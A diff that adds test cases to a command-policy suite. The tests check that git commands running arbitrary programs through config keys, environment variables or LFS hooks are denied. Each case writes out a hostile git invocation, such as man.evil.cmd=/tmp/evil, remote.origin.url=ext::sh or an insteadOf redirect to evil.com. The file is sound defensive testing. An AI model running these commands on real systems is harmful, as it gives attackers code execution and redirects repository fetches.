@@ -1250,6 +1250,125 @@ tests:
     expected:
       decision: allow
 
+  # ============================================================
+  # R3 (Codex) findings — man/browser viewer, attribute-driven exec,
+  # LFS custom transfer, --config-env joined-form coverage gaps
+  # ============================================================
+
+  # --- `git help` viewer config is config-evaluated shell. Channels:
+  # man.<tool>.{cmd,path} and browser.<tool>.{cmd,path}. P0 RCE. ---
+  - id: git-c-man-viewer-cmd-deny
+    command: "git -c man.viewer=evil -c man.evil.cmd=/tmp/evil help config"
+    expected:
+      decision: deny
+    # rule_id attribution depends on `config` appearing as a help-page arg:
+    # git-c-rce-keys carves out `config` via none_of, so this falls through
+    # to git-config-rce-keys-spaceform which also covers the man.*.cmd=** keys.
+    # Both rules deny; the rule_id mismatch is cosmetic.
+  - id: git-c-browser-cmd-deny
+    command: "git -c help.browser=evil -c browser.evil.cmd=/tmp/evil help -w config"
+    expected:
+      decision: deny
+
+  # --- attribute-driven exec channels: diff.<driver>.command/textconv,
+  # merge.<driver>.driver, interactive.diffFilter, trailer.<alias>.cmd ---
+  - id: git-c-diff-driver-command-deny
+    command: "git -c diff.evil.command=/tmp/evil diff"
+    expected:
+      decision: deny
+      rule_id: git-c-rce-keys
+  - id: git-c-diff-driver-textconv-deny
+    command: "git -c diff.evil.textconv=/tmp/evil log -p"
+    expected:
+      decision: deny
+      rule_id: git-c-rce-keys
+  - id: git-c-merge-driver-deny
+    command: "git -c merge.evil.driver=/tmp/evil merge topic"
+    expected:
+      decision: deny
+      rule_id: git-c-rce-keys
+  - id: git-c-interactive-difffilter-deny
+    command: "git -c interactive.diffFilter=/tmp/evil add -p"
+    expected:
+      decision: deny
+      rule_id: git-c-rce-keys
+  - id: git-c-trailer-cmd-deny
+    command: "git -c trailer.evil.cmd=/tmp/evil commit --trailer evil -m x"
+    expected:
+      decision: deny
+      rule_id: git-c-rce-keys
+
+  # --- init.templateDir + GIT_TEMPLATE_DIR install attacker hooks on
+  # `git init` / `git clone`. ---
+  - id: git-c-init-templatedir-deny
+    command: "git -c init.templateDir=/tmp/evil-template init newrepo"
+    expected:
+      decision: deny
+      rule_id: git-c-rce-keys
+  - id: git-env-template-dir-deny
+    command: "GIT_TEMPLATE_DIR=/tmp/evil-template git init newrepo"
+    expected:
+      decision: deny
+      rule_id: git-env-rce-vars
+
+  # --- Git LFS custom transfer / extension hooks run external programs. ---
+  - id: git-c-lfs-customtransfer-deny
+    command: "git -c lfs.customTransfer.evil.path=/tmp/evil clone https://example.com/r.git"
+    expected:
+      decision: deny
+      rule_id: git-c-rce-keys
+  - id: git-c-lfs-standalonetransfer-deny
+    command: "git -c lfs.standalonetransferagent=evil clone https://example.com/r.git"
+    expected:
+      decision: deny
+      rule_id: git-c-rce-keys
+  - id: git-c-lfs-extension-clean-deny
+    command: "git -c lfs.extension.evil.clean=/tmp/evil add file.bin"
+    expected:
+      decision: deny
+      rule_id: git-c-rce-keys
+
+  # --- send-email / imap executable setters via persistent config ---
+  - id: git-config-set-sendemail-sendmailcmd-deny
+    command: "git config sendemail.sendmailCmd /tmp/evil"
+    expected:
+      decision: deny
+      rule_id: git-config-rce-keys-spaceform
+  - id: git-config-set-imap-tunnel-deny
+    command: "git config imap.tunnel /tmp/evil"
+    expected:
+      decision: deny
+      rule_id: git-config-rce-keys-spaceform
+
+  # --- --config-env joined form for R3 keys ---
+  - id: git-config-env-joined-remote-uploadpack-deny
+    command: "EVIL=/tmp/evil git --config-env=remote.origin.uploadpack=EVIL fetch"
+    expected:
+      decision: deny
+      rule_id: git-c-rce-keys
+  - id: git-config-env-joined-remote-url-ext-deny
+    command: "EVIL=ext::sh git --config-env=remote.origin.url=EVIL fetch"
+    expected:
+      decision: deny
+      rule_id: git-c-rce-keys
+  - id: git-config-env-joined-url-insteadof-deny
+    command: "EVIL=https://github.com/ git --config-env=url.https://evil.com/.insteadOf=EVIL fetch origin"
+    expected:
+      decision: deny
+      rule_id: git-c-rce-keys
+
+  # --- False-positive guard: `git config url.<URL>.insteadOf` (read form,
+  # one arg after subcommand) must NOT deny. The broad url.*://** pattern
+  # previously also fired on reads. ---
+  - id: git-config-read-url-insteadof-allow
+    command: "git config url.https://evil.com/.insteadOf"
+    expected:
+      decision: allow
+    # 2-arg form is a read; min_args=3 on spaceform should exclude it.
+    # Pre-fix the joined-form pattern url.*://** fired on this too because
+    # joined-form rule had no min_args carve-out. Fix splits the URL-base
+    # pattern only on the joined-form rule.
+
   # --- Credential URL: any scheme denies via `credential.*://**` ---
   - id: git-c-credential-arbitrary-scheme-deny
     command: "git -c credential.gopher://x.com.helper=/tmp/evil fetch"
